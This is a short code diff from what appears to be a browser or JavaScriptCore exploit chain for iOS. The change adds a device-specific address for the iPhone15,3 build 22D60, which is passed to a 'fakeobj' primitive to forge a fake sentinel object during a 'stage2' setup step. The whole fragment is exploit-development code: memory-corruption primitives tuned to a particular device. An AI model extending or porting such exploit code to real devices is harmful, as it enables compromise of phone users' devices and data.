@@ -18488,7 +18488,9 @@ const device_chipset = {
           }
           print("setup_stage2: building change_scribble_holder");
           print("setup_stage2: fake sentinel begin");
-          let fake_sentinel = p.fakeobj(0x108240700000000n);
+          const stage2FakeSentinelAddr = p.device_model === "iPhone15,3_22D60" ? 0x0108240700006000n : 0x108240700000000n;
+          print(`setup_stage2: fake sentinel addr=${stage2FakeSentinelAddr.hex()}`);
+          let fake_sentinel = p.fakeobj(stage2FakeSentinelAddr);
           print("setup_stage2: fake sentinel done");
           let change_scribble_holder = {
             p1: fake_sentinel,
